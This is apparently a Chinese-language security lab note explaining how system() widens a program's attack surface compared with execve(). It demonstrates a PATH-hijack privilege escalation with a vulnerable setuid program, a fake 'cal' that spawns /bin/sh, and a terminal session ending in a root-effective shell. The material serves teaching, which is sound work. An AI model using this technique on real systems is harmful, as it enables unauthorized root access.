# 通过外部程序&程序库进行攻击

#### 两种典型调用外部程序方式
1. **使用exec()函数族**，最终使用execve()系统调用将外部程序载如内存并执行(即外部程序直接执行)，攻击面是程序本身和外部程序。  
2. **使用system()函数**，该函数通过fork()函数创建一个子进程，然后使用execl()函数运行外部程序，execl()最终也会调用execve()。system()不直接运行外部程序，它使用execve()来执行/bin/sh，通过shell程序来执行外部程序，所以攻击面相当于是程序本身和外部程序再加上shell的攻击面。  


#### PATH环境变量
许多环境变量都可以影响shell程序行为。shell程序运行命令时，如果没有提供命令位置，shell将使用PATH环境变量来搜索。

如果这个程序是Set-UID的，攻击者就操作变量执行不是真正的日历程序，得到一个有root权限的shell。
```
// val.c
# include <stdlib.h>

int main()
{
    system("cal");
}

```
```
// cal.c
# include <stdlib.h>

int main()
{
    system("/bin/sh");
}
```
```
ubuntu@VM-0-17-ubuntu:~$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
ubuntu@VM-0-17-ubuntu:~$ export PATH=.:$PATH  # 把当前目录放入环境变量
ubuntu@VM-0-17-ubuntu:~$ echo $PATH  # 当前目录在最前面，所以会最先搜索此目录
.:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
ubuntu@VM-0-17-ubuntu:~$ ./val 
$ id
uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lxd)
$ exit
ubuntu@VM-0-17-ubuntu:~$ sudo chown root val
ubuntu@VM-0-17-ubuntu:~$ sudo chmod 4755 val
ubuntu@VM-0-17-ubuntu:~$ ./val 
$ id
uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lxd)
$ exit
ubuntu@VM-0-17-ubuntu:~$ sudo ln -sf /bin/zsh /bin/sh  # ubuntu16.04以上指向的dash有保护机制，试验用zsh
ubuntu@VM-0-17-ubuntu:~$ ./val 
# id
uid=1000(ubuntu) gid=1000(ubuntu) euid=0(root) groups=1000(ubuntu),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lxd)
```

#### 减小攻击面
与system函数相比execve函数攻击面要小的多，因为execve不调用shell，所以不受环境变量影响。


&emsp;
#### 通过程序库攻击
程序通常需要使用外部库(第三方库)中的函数。外部库中的函数如果使用了环境变量，就增加了程序的攻击面。

防御措施：与程序库相关的攻击面的防御措施取决于程序库的作者。



